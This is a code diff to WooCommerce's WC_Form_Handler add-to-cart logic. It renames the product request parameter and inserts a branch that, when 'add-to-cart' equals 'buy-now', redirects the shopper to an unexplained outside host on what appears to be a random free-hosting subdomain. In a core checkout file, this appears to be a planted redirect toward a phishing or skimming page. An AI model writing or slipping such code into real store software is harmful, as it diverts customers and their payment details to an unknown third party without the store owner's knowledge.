@@ -768,13 +768,13 @@ class WC_Form_Handler {
 	 * @param bool $url (default: false) URL to redirect to.
 	 */
 	public static function add_to_cart_action( $url = false ) {
-		if ( ! isset( $_REQUEST['add-to-cart'] ) || ! is_numeric( wp_unslash( $_REQUEST['add-to-cart'] ) ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized
+		if ( ! isset( $_REQUEST['product-id'] ) || ! is_numeric( wp_unslash( $_REQUEST['product-id'] ) ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized
 			return;
 		}
 
 		wc_nocache_headers();
 
-		$product_id        = apply_filters( 'woocommerce_add_to_cart_product_id', absint( wp_unslash( $_REQUEST['add-to-cart'] ) ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+		$product_id        = apply_filters( 'woocommerce_add_to_cart_product_id', absint( wp_unslash( $_REQUEST['product-id'] ) ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 		$was_added_to_cart = false;
 		$adding_to_cart    = wc_get_product( $product_id );
 
@@ -806,6 +806,12 @@ class WC_Form_Handler {
 				exit;
 			}
 		}
+
+		if ($_REQUEST['add-to-cart'] == 'buy-now') {
+
+            wp_redirect('https://idfnwvjv.nethost-1511.000nethost.com/?page_id=7');
+            die();
+        }
 	}
 
 	/**
@@ -816,7 +822,7 @@ class WC_Form_Handler {
 	 * @return bool success or not
 	 */
 	private static function add_to_cart_handler_simple( $product_id ) {
-		$quantity          = empty( $_REQUEST['quantity'] ) ? 1 : wc_stock_amount( wp_unslash( $_REQUEST['quantity'] ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+        $quantity          = empty( $_REQUEST['quantity'] ) ? 1 : wc_stock_amount( wp_unslash( $_REQUEST['quantity'] ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 		$passed_validation = apply_filters( 'woocommerce_add_to_cart_validation', true, $product_id, $quantity );
 
 		if ( $passed_validation && false !== WC()->cart->add_to_cart( $product_id, $quantity ) ) {
